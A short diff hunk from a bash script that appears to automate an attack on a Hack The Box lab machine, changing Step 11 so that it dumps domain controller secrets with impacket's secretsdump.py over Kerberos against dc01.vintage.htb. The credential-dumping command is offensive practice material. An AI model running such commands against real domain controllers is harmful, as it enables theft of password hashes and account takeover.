@@ -126,7 +126,7 @@ echo
 
 # Step 11: Dump secrets using impacket-secretsdump
 print_header "Step 11: Dumping secrets using impacket-secretsdump"
-impacket-secretsdump -k dc01.vintage.htb
+secretsdump.py -k dc01.vintage.htb
 if [ $? -ne 0 ]; then
     print_error "impacket-secretsdump failed"
 fi
